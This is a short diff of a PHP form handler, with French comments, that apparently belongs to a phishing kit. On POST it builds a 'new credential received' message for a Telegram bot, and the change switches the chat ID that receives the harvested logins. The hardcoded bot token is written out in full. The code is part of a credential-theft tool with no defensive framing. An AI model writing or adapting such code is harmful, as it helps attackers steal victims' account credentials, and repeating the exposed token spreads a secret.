@@ -79,7 +79,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // Configuration Telegram
     $telegramBotToken = '8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ'; // Remplacez par le token de votre bot Telegram
-    $chatID = '-4639401211'; // Remplacez par l'ID de votre chat ou groupe Telegram
+    $chatID = '-1002514605037'; // Remplacez par l'ID de votre chat ou groupe Telegram
 
     // Message formaté
     $message = "<b>🔐 Nouveau identifiant reçu :</b>\n\n";
